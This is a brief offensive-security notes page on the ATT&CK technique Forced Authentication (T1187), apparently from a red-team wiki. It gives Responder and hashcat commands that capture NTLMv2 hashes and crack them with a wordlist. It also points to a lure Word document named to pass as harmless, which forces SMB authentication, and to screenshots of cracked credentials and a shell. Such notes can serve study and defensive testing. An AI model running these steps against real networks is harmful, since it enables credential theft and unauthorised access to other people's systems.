---
description: 'Credential Access, Stealing hashes'
---

# T1187: Forced Authentication

## Execution

```csharp
responder -I eth1
hashcat -m5600 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-10.0.0.2.txt /usr/share/wordlists/rockyou.txt --force
```

![](../.gitbook/assets/forced-auth-word.png)

{% file src="../.gitbook/assets/totes-not-a-scam.docx" caption="Forced SMBv2 Authentication - MS Word File" %}

![](../.gitbook/assets/forced-auth-hashes.png)

![](../.gitbook/assets/forced-auth-cracked.png)

![](../.gitbook/assets/forced-auth-shell%20%281%29.png)

## Observations

{% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1187\",\"type\":\"link\",\"title\":\"Forced Authentication - ATT&CK for Enterprise\"}" %}

